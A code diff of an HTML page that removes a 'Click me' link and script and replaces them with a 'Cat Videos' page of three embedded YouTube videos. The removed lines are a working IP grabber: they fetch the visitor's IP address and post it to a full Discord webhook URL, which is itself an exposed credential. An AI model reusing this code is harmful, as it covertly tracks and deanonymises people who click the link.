@@ -1,18 +1,20 @@
-<a href="#" onclick="logIPAndSend('https://discord.com/api/webhooks/1390407856527904982/ijfqflvt7QMjNERrl-oQk8b147WwMois4Ptos8xCNGboOPn_O878wveOaLUoMYG6nM5l'); return false;">Click me</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cat Videos</title>
+</head>
+<body>
+    <h1>Cat Videos</h1>
 
-<script>
-function logIPAndSend(webhookUrl) {
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: `IP: ${ip}` })
-            });
-        });
-}
-</script>
+    <!-- First Cat Video -->
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/OWbtxdq5rvQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+    <!-- Second Cat Video -->
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/tFUIVRLXD68" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+    <!-- Third Cat Video -->
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/-CNymheDE3M" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</body>
+</html>
